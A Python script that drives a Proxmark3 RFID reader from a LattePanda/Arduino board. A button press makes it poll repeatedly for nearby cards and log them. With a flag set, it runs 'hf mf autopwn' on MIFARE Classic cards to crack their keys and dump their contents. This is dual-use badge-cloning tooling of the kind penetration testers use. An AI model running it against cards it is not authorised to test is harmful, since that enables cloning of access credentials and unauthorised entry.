#!/usr/bin/env python3

from output_grabber import OutputGrabber
from pyfirmata import Arduino, util
import pm3
import argparse
import subprocess
import re
import time




def card_search(command,output_file,force):

    p=pm3.pm3("/dev/ttyACM1") #Initialize connection to the proxmark
    print('\n')
    print('Searching for cards...') 
    print('\n') 
    
    button_pin=board.get_pin('d:11:i') #we take D11 as input for the button
    led_pin=board.get_pin('d:13:o') #We take the led from the Latte Panda board
    try:
        while True:   
            button_state=False
            pressed=0

            button_state_new=button_pin.read()
            if button_state!=button_state_new: #Check if the button has changed position
                button_state=button_state_new

                if button_state:
                    pressed=pressed+1 #count the number of time the button has been pressed

            if pressed%2!=0:
                led_pin.write(1) #If the script is running turn the led on
                out = OutputGrabber()  #used to grab the output of the command


                with out:
                    p.console(command)
                with open(output_file,'a') as f:
                    if '+' in out.capturedtext:
                        print("Carte trouvée :")
                        print(out.capturedtext)
                        f.write("Carte trouvée :\n")
                        f.write(f"Date : {time.ctime(time.time())}\n")
                    for line in out.capturedtext.split('\n'):
                        if '+' in line:
                            f.write(line + '\n')

                    f.write("\n")

                    if "MIFARE Classic" in out.capturedtext and force:
                        p=None
                        crack_key(f)
                        p=pm3.pm3("/dev/ttyACM1")
            else:
                led_pin.write(0)
                time.sleep(0.1)
                
    except KeyboardInterrupt:
        board.exit()

def crack_key(f):

    print("Trying to crack keys ...")
    crack= subprocess.run(['../../../pm3','-c','hf mf autopwn'], stdout=subprocess.PIPE)
    pattern = r'(/[^\n]+\.bin)'
    pattern2 = r'(/[^\n]+\.json)'
    file_paths = re.findall(pattern, crack.stdout.decode('utf-8'))
    file_paths2 = re.findall(pattern2, crack.stdout.decode('utf-8'))
    print(file_paths)
    result=f"Clé trouvée : {file_paths[0]}\nDump de la carte : {file_paths[1]},{file_paths2[0]}\n"
    f.write(result)
    f.write("\n"+"-"*150+"\n")


def parse_arguments():

    parser = argparse.ArgumentParser(description="Auto-Search cards -h, -hf, and -lf options")
    parser.add_argument('-hf', '--high_f',action='store_true', help="Search for high frequency cards")
    parser.add_argument('-lf', '--low_f',action='store_true',  help="Search for low frequency cards")
    parser.add_argument('-a','--all',action='store_true',help="Search for all frequencies")
    parser.add_argument('-k','--key',action='store_true',help="Try to crack the key")
    parser.add_argument('-14a','--14acard',action='store_true',help="Search for ISO 14443a cards (Mifare...)")
    parser.add_argument('-o','--output_file',required=True, type=str, help="Output files")
    args = parser.parse_args()

    if args.high_f:
        command='hf search'
    elif args.low_f:
        command='lf search'
    elif args.all:
        command='auto'
    else:
        command='hf 14a info'
    return args,command

if __name__ == '__main__':

    board=Arduino('/dev/ttyACM0') #Initialize the connection to the Arduino board
    it=util.Iterator(board)

    args,command=parse_arguments() #Parse arguments
    card_search(command,args.output_file,args.key)





